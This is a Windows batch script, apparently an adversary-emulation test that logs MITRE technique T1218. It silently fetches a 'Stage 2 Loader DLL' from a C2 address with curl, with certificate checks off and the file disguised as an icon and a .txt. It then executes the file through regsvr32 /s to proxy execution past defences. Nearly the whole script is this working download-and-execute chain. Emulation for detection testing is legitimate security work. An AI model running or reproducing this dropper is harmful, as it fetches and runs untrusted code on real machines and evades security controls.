@echo off
SETLOCAL EnableDelayedExpansion

REM ===== Placeholder constant declarations (random-named SET variables) =====
SET a1b2c=%APPDATA%\11210\61f128ee
SET d3e4f=cef8dacd.txt
SET g5h6i=https://10.0.0.49/stage/2/icon.png?11210-7
SET j7k8l=BALAM-S2B
SET m9n0o=11210
SET p1q2r=7
SET s3t4u=%PUBLIC%\\macula-simulations.log

REM ===== Timestamp cache =====
SET tsvar=!DATE!/!TIME!

REM ===== Debug log: heartbeat_start =====
echo [!tsvar!][DEBUG][!j7k8l!][!m9n0o!]: heartbeat_start>> "!s3t4u!" 2>nul

REM ===== 1. Heartbeat fetch via curl =====
REM Download Stage 2 Loader DLL from C2 heartbeat endpoint to output directory
REM Use --create-dirs to ensure output path exists (silently ignore if exists)
curl -k -s -o "!a1b2c!\!d3e4f!" --create-dirs "!g5h6i!"

REM Capture result
SET hb_result=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!j7k8l!][!m9n0o!]: heartbeat_complete=%hb_result%>> "!s3t4u!" 2>nul

REM ===== 2. Change working directory to output directory =====
echo [!tsvar!][DEBUG][!j7k8l!][!m9n0o!]: chdir_start>> "!s3t4u!" 2>nul
cd /d "!a1b2c!" >nul 2>&1
echo [!tsvar!][DEBUG][!j7k8l!][!m9n0o!]: chdir_result=!ERRORLEVEL!>> "!s3t4u!" 2>nul

REM ===== 3. Invoke Stage 2 Loader DLL via regsvr32 =====
echo [!tsvar!][DEBUG][!j7k8l!][!m9n0o!]: regsvr32_start>> "!s3t4u!" 2>nul
regsvr32.exe /s "!d3e4f!" >nul 2>&1
SET rv_result=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!j7k8l!][!m9n0o!]: regsvr32_result=%rv_result%>> "!s3t4u!" 2>nul

REM ===== 4. TTP log line =====
REM Evaluate overall result: OK if both curl and regsvr32 succeeded
IF %hb_result% EQU 0 (
    IF %rv_result% EQU 0 (
        SET ttp_result=OK
        SET ttp_error=
    ) ELSE (
        SET ttp_result=FAIL
        SET ttp_error=regsvr32_error=%rv_result%
    )
) ELSE (
    SET ttp_result=FAIL
    SET ttp_error=curl_error=%hb_result%
)
echo [!tsvar!][TTP][!j7k8l!][!m9n0o!]: T1218^|System Binary Proxy Execution=!ttp_result!:!ttp_error!>> "!s3t4u!" 2>nul

REM ===== Exit / terminate =====
ENDLOCAL
exit /b 0